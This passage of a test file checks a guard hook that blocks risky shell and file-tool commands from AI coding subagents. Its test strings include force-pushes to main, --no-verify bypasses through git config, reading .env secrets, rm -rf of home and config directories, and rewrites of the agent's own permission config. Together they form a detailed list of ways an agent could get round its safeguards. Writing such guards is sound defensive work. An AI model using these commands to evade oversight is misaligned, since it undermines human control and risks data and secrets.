    expect(check({ command: "npx playwright install", cwd: wt, main, rules: r })).toBeNull();
  });

  it("deny rules never apply to git or gh themselves", () => {
    const r = guardOnly({ deny: [{ argv: ["gh", "pr", "view"], reason: "x" }, { path: "scripts/x.sh", reason: "y" }] });
    expect(check({ command: "gh pr view 3", cwd: wt, main, rules: r })).toBeNull();
    expect(check({ command: "git add scripts/x.sh", cwd: wt, main, rules: r })).toBeNull();
  });

  it.each([
    ["node --import tsx scripts/merge-gate.ts", "node --import tsx scripts/merge-gate.ts --fast", ["npx tsx scripts/merge-gate.ts", "node --import tsx scripts/merge-gate.ts", "cd scripts && tsx merge-gate.ts"], ["npx tsx scripts/merge-gate.ts --fast", "cat scripts/merge-gate.ts"]],
    ["bash scripts/merge.sh", "bash scripts/merge.sh fast", ["./scripts/merge.sh", "sh scripts/merge.sh", "cd scripts && ./merge.sh"], ["./scripts/merge.sh fast", "git add scripts/merge.sh"]],
    ["nice -n 5 make gate", "make fast", ["make gate", "nice make gate"], ["make fast", "make build"]],
    ["/bin/bash scripts/ci/full.sh --all", "/bin/bash scripts/ci/full.sh --quick", ["scripts/ci/full.sh --all", "bash scripts/ci/full.sh"], ["cat scripts/ci/full.sh"]],
  ])("auto-deny of gate.merge `%s`", (merge, fast, deny, allow) => {
    const r = withRules({ gate: { ...FIXTURE_CONTRACT.gate, merge, fast }, guard: { envFiles: [], postgres: null, deny: [] } });
    for (const c of deny) expect(check({ command: c, cwd: wt, main, rules: r }), c).toMatch(/merge gate/);
    for (const c of allow) expect(check({ command: c, cwd: wt, main, rules: r }), c).toBeNull();
  });
});

describe("review fixes — parse paths that must not fail open (6)", () => {
  it("nesting deeper than the guard checks is BLOCKED, never allowed", () => {
    expect(blocked("eval eval eval eval eval eval eval ls")).toMatch(/too deep/);
    expect(blocked("bash -c \"eval 'echo \\$(git rev-parse HEAD)'\"")).toBeNull();
  });

  it.each([
    ["env -S 'gh pr merge 1'"],
    ["env --split-string='npm run check'"],
    ["/usr/bin/env -S\"gh pr merge 1\""],
    ["env -iS 'git stash'"],
    ["corepack pnpm run check"],
    ["corepack yarn check"],
    [`env -C ${main} git reset --hard`],
    ["npx prisma@5 migrate reset --force"],
  ])("blocks %s", (cmd) => {
    expect(blocked(cmd)).not.toBeNull();
  });

  it.each([["env -S 'npm run check -- --fast'"], ["corepack enable"], [`env -C ${wt} git reset --hard`]])("allows %s", (cmd) => {
    expect(blocked(cmd)).toBeNull();
  });
});

describe("review fixes — protected Postgres targets (7)", () => {
  it.each([
    ["psql -p 06543"],
    ["psql --port=06543 -d x"],
    ["psql --port 06543"],
    ["PGPORT=06543 psql"],
    ["psql -p06543"],
    ['psql "port=6543 dbname=x"'],
    ['psql "dbname=app_dev"'],
    ['psql "host=db.internal port=6543 user=x"'],
    ["psql postgresql://u@[::1]:6543/x"],
    ["psql postgresql://u@db.internal:6543/x"],
    ["psql postgresql://u@localhost/app%5Fdev"],
    ["psql 'postgresql:///x?port=6543'"],
    ["psql 'postgresql://localhost/x?dbname=app_dev'"],
    ["psql postgresql://a,b:6543/x"],
    ["DATABASE_URL=postgres://u@127.0.0.1:06543/x npx vitest run"],
  ])("blocks %s", (cmd) => {
    expect(blocked(cmd)).toMatch(/protected database/);
  });

  it.each([["psql -p 5432"], ["curl http://localhost:3000/api"], ["psql postgresql://localhost:5432/app_test_x"], ["report=6543 ./x.sh"], ["mkdir -p apps/api"]])("allows %s", (cmd) => {
    expect(blocked(cmd)).toBeNull();
  });

  it("a database path is matched only inside a URL", () => {
    const r = guardOnly({ postgres: { ports: [], databases: ["dev"] } });
    expect(check({ command: "ls foo 2>/dev/null", cwd: wt, main, rules: r })).toBeNull();
    expect(check({ command: "psql postgresql://localhost/dev", cwd: wt, main, rules: r })).toMatch(/protected database/);
  });
});

describe("review fixes — pushes to the base branch and repo writes through the API (8)", () => {
  it.each([
    ["git push origin main"],
    ["git push origin HEAD:main"],
    ["git push origin HEAD:refs/heads/main"],
    ["git push origin feat/x:master"],
    ["git push -u origin feat/x:main"],
    ["git push --all origin"],
    ["git push --mirror origin"],
    ["gh api -X PUT repos/o/r/contents/README.md -f message=x -f content=eA=="],
    ["gh api repos/o/r/git/trees -f base_tree=x"],
    ["gh api -X POST repos/o/r/git/commits -f message=x"],
    ["gh api -X PUT repos/o/r/branches/main/protection --input p.json"],
    ["gh api -X POST repos/o/r/merges -f base=main -f head=x"],
    ["gh api graphql -f query='mutation { createCommitOnBranch(input: {}) { commit { oid } } }'"],
  ])("blocks %s", (cmd) => {
    expect(blocked(cmd)).not.toBeNull();
  });

  it("the contract's base branch is protected too", () => {
    const r = withRules({ baseBranch: "develop" });
    expect(check({ command: "git push origin HEAD:develop", cwd: wt, main, rules: r })).toMatch(/base branch/);
    expect(check({ command: "git push origin HEAD:refs/heads/develop", cwd: wt, main, rules: r })).toMatch(/base branch/);
  });

  it.each([["git push -u origin HEAD:feat/x"], ["git push origin feat/main-fix"], ["git push -o ci.skip origin HEAD:feat/y"], ["gh api repos/o/r/contents/README.md"], ["gh api repos/o/r/branches/main"]])("allows %s", (cmd) => {
    expect(blocked(cmd)).toBeNull();
  });
});

describe("review fixes — --no-verify through git config (9)", () => {
  it.each([
    ["git -c alias.ci='commit --no-verify' ci -m x"],
    ["git -c include.path=/tmp/x commit -m y"],
    ["git -c includeIf.gitdir:/x/.path=/tmp/x commit -m y"],
    ["git --config-env=core.hooksPath=HP commit -m y"],
    ["GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=/dev/null git commit -m x"],
    ["export GIT_CONFIG_PARAMETERS=\"'core.hooksPath'='/dev/null'\""],
    ["GIT_CONFIG_KEY_0=core.hooksPath"],
    ["git config alias.ci 'commit --no-verify'"],
    ["git config --local include.path ../x"],
    ["git config includeIf.gitdir:/x/.path /tmp/x"],
    ["git config set alias.p 'push --no-verify'"],
  ])("blocks %s", (cmd) => {
    expect(blocked(cmd)).toMatch(/no-verify/);
  });

  it.each([["git config --get alias.ci"], ["git config user.name"], ["git -c user.name=x commit -m y"], ["git config --list"]])("allows %s", (cmd) => {
    expect(blocked(cmd)).toBeNull();
  });
});

// ---- third review round ---------------------------------------------------------------------------
describe("round 3 — Grep and Glob never reach an env file (1)", () => {
  const search = (tool: string, input: Record<string, string>) => checkSearch({ tool, input, cwd: wt, rules });
  it.each([
    ["Grep", { pattern: "SECRET", path: ".env" }],
    ["Grep", { pattern: "SECRET", path: `${wt}/apps/.env.local` }],
    ["Grep", { pattern: "SECRET", glob: ".env*" }],
    ["Grep", { pattern: "SECRET", glob: "**/.env" }],
    ["Grep", { pattern: "SECRET", glob: "*.{env,local}" }],
    // ripgrep's -g has no dotfile rule and overrides ignore files: `*` reaches .env
    ["Grep", { pattern: "SECRET", glob: "*" }],
    ["Glob", { pattern: "**/.env*" }],
    ["Glob", { pattern: ".e?v" }],
    ["Glob", { pattern: "*", path: `${wt}/.env` }],
  ])("blocks %s %j", (tool, input) => {
    expect(search(tool, input)).toMatch(/env files/);
  });

  it.each([
    ["Grep", { pattern: ".env", path: "src" }],
    ["Grep", { pattern: "x", glob: "*.ts" }],
    ["Grep", { pattern: "x", path: ".env.example" }],
    ["Glob", { pattern: "**/*.ts" }],
    // Glob lists names only, with shell semantics: a leading * does not match a leading dot
    ["Glob", { pattern: "src/**/*" }],
  ])("allows %s %j", (tool, input) => {
    expect(search(tool, input)).toBeNull();
  });
});

describe("round 3 — package-manager exec forms are wrappers (2)", () => {
  it.each([
    ["npm exec tsx scripts/check.ts"],
    ["npm exec -- tsx scripts/check.ts"],
    ["npm x tsx scripts/check.ts"],
    ["npm exec -c 'npm run check'"],
    ["npm exec --call='gh pr merge 1'"],
    ["npx -c 'gh pr merge 1'"],
    ["pnpm dlx prisma migrate reset --force"],
    ["pnpm exec prisma db push"],
    ["pnpm --filter api exec tsx scripts/check.ts"],
    ["yarn dlx prisma migrate reset"],
    ["yarn exec gh pr merge 1"],
    ["bunx prisma migrate reset --force"],
  ])("blocks %s", (cmd) => {
    expect(blocked(cmd)).not.toBeNull();
  });

  it.each([["npm exec vitest run"], ["pnpm exec vitest run x"], ["npx -c 'vitest run'"], ["pnpm --filter web run build"], ["npm exec tsx scripts/check.ts --fast"]])("allows %s", (cmd) => {
    expect(blocked(cmd)).toBeNull();
  });
});

describe("round 3 — config that redirects git, uninspectable GraphQL (3)", () => {
  it.each([
    ["git -c remote.origin.push=HEAD:main push", /redirect/],
    ["git -c remote.origin.url=/tmp/evil fetch", /redirect/],
    ["git -c url.https://evil.example/.insteadOf=https://github.com/ push", /redirect/],
    ["git --config-env=remote.origin.pushurl=X push", /redirect/],
    ["git config remote.origin.push HEAD:main", /redirect/],
    ["git config url.x.insteadOf y", /redirect/],
    ["git remote set-url origin /tmp/evil", /redirect/],
    ["git remote add evil /tmp/evil", /redirect/],
    ["HOME=/tmp/h git commit -m x", /config git reads/],
    ["XDG_CONFIG_HOME=/tmp/x git commit -m x", /config git reads/],
    ["env HOME=/tmp/h git push", /config git reads/],
    ["gh api graphql --input q.json", /cannot be inspected/],
    ["gh api graphql -F query=@q.graphql", /cannot be inspected/],
    ["gh api graphql --field=query=@- ", /cannot be inspected/],
  ])("blocks %s", (cmd, msg) => {
    expect(blocked(cmd)).toMatch(msg);
  });

  it.each([["git config --get remote.origin.url"], ["git remote -v"], ["git remote get-url origin"], ["HOME=/tmp/h npx vitest run"], ["gh api graphql -f query='query { viewer { login } }'"], ["git -c user.name=x commit -m y"]])("allows %s", (cmd) => {
    expect(blocked(cmd)).toBeNull();
  });
});

describe("round 3 — Bash writes into the main checkout (4)", () => {
  it.each([
    [`echo x > ${main}/notes.txt`],
    [`echo x >${main}/notes.txt`],
    [`cd ${main} && echo x >> CHANGELOG.md`],
    [`ls 2>${main}/err.log`],
    [`cat <<'EOF' > ${main}/review.md\nbody\nEOF`],
    [`printf x | tee ${main}/x`],
    [`tee -a ${main}/y < /dev/null`],
    [`cp a.txt ${main}/`],
    [`cp -t ${main} a.txt`],
    [`mv ${main}/src/x.ts /tmp/x.ts`],
    [`install -m 644 a ${main}/b`],
    [`ln -s /tmp/x ${main}/y`],
    [`sed -i '' 's/a/b/' ${main}/f.txt`],
    [`sed -i 's/a/b/' ${main}/f.txt`],
    [`perl -pi -e 's/a/b/' ${main}/f.txt`],
    [`rm -rf ${main}/src`],
    [`cd ${main} && rm x.txt`],
    ["rm -rf ../../../src"],
    [`bash -c "echo x > ${main}/z"`],
  ])("blocks %s", (cmd) => {
    expect(blocked(cmd)).toMatch(/main checkout/);
  });

  it.each([
    ["echo x > out.txt"],
    ["echo x > /tmp/x"],
    ["ls 2>/dev/null"],
    ["echo x >&2"],
    ["npm test 2>&1 | tee test.log"],
    [`cp ${main}/README.md .`],
    [`cat ${main}/README.md > copy.md`],
    ['cd "$X" && rm -rf dist'],
    [`sed -n 's/a/b/p' ${main}/f.txt`],
    [`echo x > ${wt}/y`],
    [`rm -rf ${main}/.claude/worktrees/wt-1/dist`],
    ["cat > \"$TMPDIR/review.md\" <<'EOF'\nbody\nEOF"],
    ['git commit -m "> quoted"'],
  ])("allows %s", (cmd) => {
    expect(blocked(cmd)).toBeNull();
  });

  it("through a worktree symlink into <MAIN>: writing follows it, removing the link itself does not", () => {
    const link = join(wt, "node_modules");
    symlinkSync(join(main, "node_modules"), link);
    try {
      expect(blocked("echo x > node_modules/pkg.js")).toMatch(/main checkout/);
      expect(blocked("rm -rf node_modules/")).toMatch(/main checkout/);
      expect(blocked("rm -rf node_modules")).toBeNull();
      expect(blocked("unlink node_modules; rm node_modules")).toBeNull();
    } finally {
      rmSync(link);
    }
  });
});

// ---- fourth review round ----------------------------------------------------------------------------
describe("round 4 C — two tiers: workers keep the full floor, other subagents lose only the issue and <MAIN>-write blocks", () => {
  const other = (command: string, cwd = wt) => check({ command, cwd, main, rules, worker: false });
  it.each([["gh issue create --title x"], [`echo x >> ${main}/.argus/run.log`], [`tee ${main}/.momus/state.json < /dev/null`], [`cp r.md ${main}/.nemesis/r.md`]])("another subagent may: %s", (cmd) => {
    expect(other(cmd)).toBeNull();
    expect(blocked(cmd)).not.toBeNull();
  });

  it.each([["git push origin HEAD:main"], ["gh pr merge 1"], ["git stash"], ["git commit --no-verify -m x"], ["cat .env"], ["psql -p 6543"], ["npm run check"], [`echo x > ${main}/.git/hooks/pre-push`]])("another subagent still may not: %s", (cmd) => {
    expect(other(cmd)).not.toBeNull();
  });

  it("the file tools follow the same tiers", () => {
    expect(checkFile({ tool: "Write", filePath: `${main}/.claude/agent-memory/x/y.md`, cwd: wt, main, rules, worker: false })).toBeNull();
    expect(checkFile({ tool: "Write", filePath: `${main}/.claude/agent-memory/x/y.md`, cwd: wt, main, rules })).toMatch(/main checkout/);
    expect(checkFile({ tool: "Read", filePath: `${wt}/.env`, cwd: wt, main, rules, worker: false })).toMatch(/env files/);
  });
});

describe("round 4 D — cheap closures", () => {
  it.each([
    // git accepts unambiguous prefixes of long options
    ["git commit --no-verif -m x"],
    ["git push --no-ver"],
    ["git push --forc origin x"],
    ["git push --for origin x"],
    ["git push origin --del x"],
    ["git push --mirr origin"],
    ["git branch --dele feat/x"],
    // push destination as git resolves it
    ["git push origin heads/main"],
    ["git push origin HEAD:heads/main"],
    // other worktrees' branches, index and object rewrites, <MAIN>'s index
    ["git checkout --ignore-other-worktrees main"],
    ["git switch --ignore-oth main"],
    ["git worktree add -f ../x main"],
    ["git worktree add --force ../x main"],
    ["git fetch -u origin main:main"],
    ["git fetch --update-head origin main:main"],
    ["git replace HEAD abc123"],
    ["git update-index --skip-worktree x.ts"],
    ["git update-index --assume-unchanged x.ts"],
    ["git checkout-index -a -f"],
    ["git read-tree HEAD"],
    [`git -C ${main} add .`],
    [`git -C ${main} notes add -m x`],
    ["git -c push.default=current push"],
    ["git config push.default matching"],
    // git's own files
    ["echo 'gitdir: /tmp/x' > .git"],
    ["echo x > .git/hooks/pre-push"],
    ["cp evil ~/.gitconfig"],
    ["echo x >> ~/.config/git/config"],
    ["git config --global core.editor vim"],
    ["git config --system core.editor vim"],
    ["git config --file .git/config core.editor vim"],
    // env files, case-insensitively, glued input redirects, ANSI-C quoting
    ["cat .ENV"],
    ["cat .Env.Local"],
    ["cat<.env"],
    ["x<.env.local"],
    ["cat $'\\x2eenv'"],
    ["cat $'.env'"],
    ['cat $".env"'],
    // a PG tool behind docker/kubectl/ssh
    ["docker exec -it pg psql -U x app_dev"],
    ["kubectl exec db -- psql app_dev"],
    ['ssh db "psql app_dev"'],
    ["ssh db psql -p 6543"],
    // gh aliases, uninspectable GraphQL queries
    ["gh alias set m 'pr merge'"],
    ["gh alias import aliases.yml"],
    ['gh api graphql -f query="$(cat q.graphql)"'],
    ["gh api graphql -f query=`cat q.graphql`"],
    // wrappers
    ["caffeinate -i npm run check"],
    ["caffeinate -t 60 gh pr merge 1"],
    ["arch -arm64 npm run check"],
    ["script -q /dev/null gh pr merge 1"],
    ["script -q -c 'gh pr merge 1' /dev/null"],
    ["bun x prisma migrate reset --force"],
    ["bun exec 'gh pr merge 1'"],
    ["exec -a x gh pr merge 1"],
    [">/dev/null gh pr merge 1"],
    ["2>/dev/null git stash"],
    // package scripts run by node/bun
    ["node --run check"],
    ["node --run=check"],
    ["bun run check"],
    ["bun run check:full"],
    // patch writes where it runs
    [`patch -d ${main} -p1 < x.diff`],
    [`cd ${main} && patch -p1 < x.diff`],
  ])("blocks %s", (cmd) => {
    expect(blocked(cmd)).not.toBeNull();
  });

  it.each([
    ["git log --all"],
    ["git fetch --all"],
    ["git push --force-with-lease"],
    ["git commit --no-edit"],
    ["git config --global --get user.name"],
    ["git config --global -l"],
    ["git worktree add ../x -b feat/x"],
    ["git fetch origin main"],
    ["git push origin feat/heads-main"],
    ["node --run test"],
    ["bun run build"],
    ["patch -p1 < x.diff"],
    ["docker exec pg psql -U x app_test_1"],
    ["echo x > .gitignore"],
    ["cat $'hello world'"],
    ["npm test 2>&1"],
    ["cat < README.md"],
    ["caffeinate -i npx vitest run"],
    ["cat .env.EXAMPLE"],
  ])("allows %s", (cmd) => {
    expect(blocked(cmd)).toBeNull();
  });

  it("the file tools refuse git's own files and env files in any case", () => {
    expect(checkFile({ tool: "Write", filePath: `${wt}/.git`, cwd: wt, main, rules })).toMatch(/git's own files/);
    expect(checkFile({ tool: "Edit", filePath: `${process.env.HOME}/.gitconfig`, cwd: wt, main, rules, worker: false })).toMatch(/git's own files/);
    expect(checkFile({ tool: "Read", filePath: `${wt}/.ENV`, cwd: wt, main, rules })).toMatch(/env files/);
    expect(checkFile({ tool: "Read", filePath: `${wt}/.git/config`, cwd: wt, main, rules })).toBeNull();
  });
});

describe("sapu's machine config (~/.config/sapu/) is written by the person at the machine, never a subagent", () => {
  const MC = /sapu's machine config/;
  const HOME = process.env.HOME;

  it.each([
    ["echo '{}' > ~/.config/sapu/config.json"],
    ["echo x >> ~/.config/sapu/config.json"],
    [`echo x > ${HOME}/.config/sapu/config.json`],
    ["cp permissive.json ~/.config/sapu/config.json"],
    ["cp permissive.json ~/.config/sapu/"],
    ["install -m 644 x.json ~/.config/sapu/config.json"],
    ["mv ~/.config/sapu/config.json /tmp/sapu-config.bak"],
    ["mv x.json ~/.config/sapu/config.json"],
    ["rm ~/.config/sapu/config.json"],
    ["rm -rf ~/.config/sapu"],
    ["ln -sf /tmp/permissive.json ~/.config/sapu/config.json"],
    ["tee ~/.config/sapu/config.json < x.json"],
    ["sed -i '' 's/code/x/' ~/.config/sapu/config.json"],
    ["perl -pi -e 's/code/x/' ~/.config/sapu/config.json"],
    ["git config --file ~/.config/sapu/config.json a.b c"],
    ["cd ~/.config && rm -rf sapu"],
    ["bash -c 'rm ~/.config/sapu/config.json'"],
    // removing or replacing what holds it takes the config with it
    ["rm -rf ~/.config"],
    ["mv ~/.config ~/.config.bak"],
    ["ln -sfn /tmp/elsewhere ~/.config"],
    ["rm -rf ~"],
    // a glob is judged by what its literal prefix can expand into
    ["rm -rf ~/.config/*"],
    ["rm -rf ~/.config/sap*"],
    ["rm -rf ~/.config/s?pu"],
    ["rm -rf ~/.config/[s]apu"],
    ["rm -rf ~/.c*"],
    ["rm ~/.config/sapu/*.json"],
    ["rm ~/.config/*/config.json"],
    ["cd ~ && rm -rf .c*"],
    // a leading $HOME / ${HOME} is read like ~
    ['rm "$HOME/.config/sapu/config.json"'],
    ['rm "${HOME}/.config/sapu/config.json"'],
    ["rm $HOME/.config/sapu/config.json"],
    ["echo '{}' > \"$HOME/.config/sapu/config.json\""],
    ['rm -rf "$HOME/.config"'],
    ['cd "$HOME/.config" && rm -rf sapu'],
    ['rm -rf "$HOME"/.config/sap*'],
  ])("blocks %s, for a worker and for any other subagent", (cmd) => {
    expect(blocked(cmd)).toMatch(MC);
    expect(check({ command: cmd, cwd: wt, main, rules, worker: false })).toMatch(MC);
  });

  it.each([
    ["cat ~/.config/sapu/config.json"],
    ["cp ~/.config/sapu/config.json ./machine-config-copy.json"],
    ["cp ~/.config/sapu/config.json /tmp/x"],
    ["echo x > ~/.config/sapu-other/config.json"],
    ["echo x > ~/.config/other/sapu/config.json"],
    ["cp notes.txt ~/.config/"],
    ["rm -rf ~/Downloads/*"],
    ["rm ~/.configure-backup"],
    ["rm -rf ~/.config/sapu-*"],
    ["ls ~/.config/*"],
    ["cat ~/.config/sapu/*"],
    ['rm "$HOME/Downloads/x.zip"'],
    // only those two spellings: any other variable stays unknown (a LIMIT in the guard's header)
    ['rm "$HOMEDIR/.config/sapu/config.json"'],
    ['rm "$HOME/$X"'],
  ])("allows %s", (cmd) => {
    expect(blocked(cmd)).toBeNull();
  });

  it.each([
    ["rm ~/.git*"],
    ["rm ~/.gitc?nfig"],
    ['rm "$HOME/.gitconfig"'],
    ['echo x >> "${HOME}/.gitconfig"'],
  ])("the same reach protects git's own files: blocks %s", (cmd) => {
    expect(blocked(cmd)).toMatch(/git's own files/);
  });

  it("a glob that can reach git's config dir is blocked; one beside it is not", () => {
    const xdg = join(root, "xdg-git");
    const saved = process.env.XDG_CONFIG_HOME;
    process.env.XDG_CONFIG_HOME = xdg;
    try {
      expect(blocked(`rm -rf ${xdg}/g*`)).toMatch(/git's own files/);
      expect(blocked(`rm -rf ${xdg}/git/*`)).toMatch(/git's own files/);
      expect(blocked(`rm -rf ${xdg}/other/*`)).toBeNull();
    } finally {
      if (saved === undefined) delete process.env.XDG_CONFIG_HOME;
      else process.env.XDG_CONFIG_HOME = saved;
    }
  });

  it("the file tools refuse writing it and allow reading it", () => {
    for (const tool of ["Write", "Edit", "MultiEdit", "NotebookEdit"]) {
      expect(checkFile({ tool, filePath: "~/.config/sapu/config.json", cwd: wt, main, rules, worker: false }), tool).toMatch(MC);
      expect(checkFile({ tool, filePath: `${HOME}/.config/sapu/other.json`, cwd: wt, main, rules }), tool).toMatch(MC);
    }
    expect(checkFile({ tool: "Read", filePath: "~/.config/sapu/config.json", cwd: wt, main, rules })).toBeNull();
    expect(checkSearch({ tool: "Grep", input: { path: "~/.config/sapu" }, cwd: wt, rules })).toBeNull();
  });

  it("guards HOME's real path and the real directory behind a symlinked ~/.config; XDG_CONFIG_HOME moves nothing", () => {
    const realHome = join(root, "mc-real-home");
    const dots = join(root, "mc-dotfiles/config");
    mkdirSync(join(dots, "sapu"), { recursive: true });
    mkdirSync(realHome, { recursive: true });
    symlinkSync(dots, join(realHome, ".config"));
    symlinkSync(realHome, join(root, "mc-home-link"));
    const saved = { HOME: process.env.HOME, XDG: process.env.XDG_CONFIG_HOME };
    process.env.HOME = join(root, "mc-home-link");
    process.env.XDG_CONFIG_HOME = join(root, "mc-xdg");
    try {
      expect(blocked(`echo x > ${realHome}/.config/sapu/config.json`)).toMatch(MC);
      expect(blocked(`echo x > ${dots}/sapu/config.json`)).toMatch(MC);
      expect(blocked(`rm -rf ${dots}/sapu`)).toMatch(MC);
      expect(checkFile({ tool: "Write", filePath: `${dots}/sapu/config.json`, cwd: wt, main, rules, worker: false })).toMatch(MC);
      expect(blocked("echo x > ~/.config/sapu/config.json")).toMatch(MC);
      expect(blocked('rm "$HOME/.config/sapu/config.json"')).toMatch(MC);
      expect(blocked(`rm -rf ${dots}/sap*`)).toMatch(MC);
      expect(blocked(`rm -rf ${realHome}/.c*`)).toMatch(MC);
      expect(blocked(`cat ${dots}/sapu/config.json`)).toBeNull();
      // sapu-contract.mjs never reads $XDG_CONFIG_HOME/sapu, so writing there lifts nothing
      expect(blocked(`echo x > ${join(root, "mc-xdg")}/sapu/config.json`)).toBeNull();
    } finally {
      process.env.HOME = saved.HOME;
      if (saved.XDG === undefined) delete process.env.XDG_CONFIG_HOME;
      else process.env.XDG_CONFIG_HOME = saved.XDG;
    }
  });
});

describe("round 4 — a parse error never lets a command through", () => {
  it.each([["exec >"], ["script -q"], ["> "], ["2>"], ["echo x >"]])("does not crash on %s", (cmd) => {
    expect(() => blocked(cmd)).not.toThrow();
  });

  it.each([["> ; gh pr merge 1"], ["exec > ; git stash"], ["script -q; gh pr merge 1"]])("still sees what follows: %s", (cmd) => {
    expect(blocked(cmd)).not.toBeNull();
  });

  it("an exception while checking blocks the call (the CLI fails closed)", () => {
    let status = 0;
    try {
      // a non-string cwd makes path resolution throw inside the check
      execFileSync("node", [GUARD], { input: JSON.stringify({ tool_name: "Bash", agent_type: "sapu:sapu-sonnet-high", tool_input: { command: "echo x > y" }, cwd: 5 }), stdio: ["pipe", "pipe", "pipe"] });
    } catch (e) {
      status = (e as { status: number }).status;
    }
    expect(status).toBe(2);
  });
});

// ---- fifth review round -------------------------------------------------------------------------------
describe("round 5 — git config that runs code or hides changes", () => {
  it.each([
    ["git -c filter.pin.clean=cat status"],
    ["git -c core.attributesFile=/tmp/a status"],
    ["git -c core.fsmonitor=/tmp/x status"],
    ["git -c core.sshCommand='ssh -o ProxyCommand=x' fetch"],
    ["git -c diff.external=/tmp/x diff"],
    ["git --config-env=filter.pin.smudge=X checkout -- x"],
    ["git config filter.pin.clean 'cat /tmp/o'"],
    ["git config core.attributesfile /tmp/a"],
    ["git config core.fsmonitor /tmp/x"],
    ["git config core.sshCommand 'ssh -i k'"],
    ["git config diff.external /tmp/x"],
  ])("blocks %s", (cmd) => {
    expect(blocked(cmd)).toMatch(/hook gate|runs code/);
  });

  it.each([["git config --get filter.lfs.clean"], ["git -c core.editor=vim commit -m x"], ["git config core.fsmonitor"]])("allows %s", (cmd) => {
    expect(blocked(cmd)).toBeNull();
  });
});

describe("round 5 — non-worker writes into <MAIN> are limited to the plugin's state dirs", () => {
  const other = (command: string) => check({ command, cwd: wt, main, rules, worker: false });
  it.each([[`sed -i '' 's/a/b/' ${main}/apps/x.ts`], [`cat > ${main}/apps/x.ts <<'EOF'\nx\nEOF`], [`echo x > ${main}/.claude/sapu.json`], [`cp a ${main}/scripts/gate.sh`], [`rm -rf ${main}/src`], [`echo x > ${main}/.argusx/y`]])("blocks %s", (cmd) => {
    expect(other(cmd)).toMatch(/main checkout/);
  });

  it.each([[`echo x > ${main}/.nemesis/f.json`], [`tee ${main}/.momus/state.json < /dev/null`], [`cp r.md ${main}/.claude/agent-memory/a/b.md`], [`echo x >> ${main}/dreams/DREAM-x.md`], [`rm -f ${main}/.argus/old.json`]])("allows %s", (cmd) => {
    expect(other(cmd)).toBeNull();
    expect(blocked(cmd)).toMatch(/main checkout/);
  });

  it("Claude Code's local agent-memory scope is a state dir too", () => {
    expect(other(`echo x > ${main}/.claude/agent-memory-local/qa/m.md`)).toBeNull();
    expect(checkFile({ tool: "Write", filePath: `${main}/.claude/agent-memory-local/qa/m.md`, cwd: wt, main, rules, worker: false })).toBeNull();
  });

  it("the main checkout spelled in another case is still the main checkout (case-insensitive disks)", () => {
    const swapped = main.replace(/[a-z]/, (c) => c.toUpperCase());
    if (swapped === main || !existsSync(swapped)) return; // case-sensitive disk: nothing to prove
    expect(other(`echo x > ${swapped}/apps/x.ts`)).toMatch(/main checkout/);
    expect(checkFile({ tool: "Write", filePath: `${swapped}/apps/x.ts`, cwd: wt, main, rules, worker: true })).toMatch(/main checkout/);
  });

  it("the file tools follow the same rule", () => {
    const f = (filePath: string, worker: boolean) => checkFile({ tool: "Edit", filePath, cwd: wt, main, rules, worker });
    expect(f(`${main}/apps/x.ts`, false)).toMatch(/main checkout/);
    expect(f(`${main}/.claude/sapu.json`, false)).toMatch(/main checkout/);
    expect(f(`${main}/.argus/cycle.json`, false)).toBeNull();
    expect(f(`${main}/.argus/cycle.json`, true)).toMatch(/main checkout/);
  });
});
